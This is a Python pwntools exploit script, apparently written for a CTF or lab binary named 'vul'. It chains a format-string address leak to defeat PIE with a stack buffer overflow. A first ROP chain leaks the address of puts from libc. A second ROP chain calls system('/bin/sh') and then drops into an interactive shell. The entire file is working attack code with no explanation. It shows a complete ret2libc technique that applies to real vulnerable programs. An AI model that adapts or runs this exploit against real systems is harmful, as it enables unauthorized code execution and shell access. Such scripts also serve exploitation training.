from pwn import *

context.log_level = "ERROR"
elf = context.binary = ELF("./vul")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP('./vul')

pty = process.PTY
io = process(stdin=pty, stdout=pty)
context.log_level = "INFO"

text_offset = elf.symbols["_start"]

io.recvuntil(b"name: ")
io.sendline(b'%37$p')
leaked_add = int(io.recvline().decode().split(' ')[1], 16)
bin_base = leaked_add - text_offset
print("Binary Base address = " + hex(bin_base))
# gdb.attach(io)

junk = b'A' * 216
puts_plt = bin_base + elf.symbols["puts"]
puts_got = bin_base + elf.got["puts"]
ret = bin_base + rop.find_gadget(["ret"]).address
pop_rdi_ret = bin_base + rop.find_gadget(["pop rdi", "ret"]).address
get_message = bin_base + elf.symbols["getmessage"]

payload = junk + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)  + p64(get_message)

io.recvuntil(b'message: ')
io.sendline(payload)
io.recvline()
leaked_add = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked_add - libc.symbols["puts"]
print("Leaked address of puts = " + hex(leaked_add))
print("Address of libc = " + hex(libc_base))

bin_sh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols["system"]
exit = libc_base + libc.symbols["exit"]

payload = junk + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system) + p64(exit)

io.recvuntil(b'message: ')
print(payload)
io.sendline(payload)
io.interactive()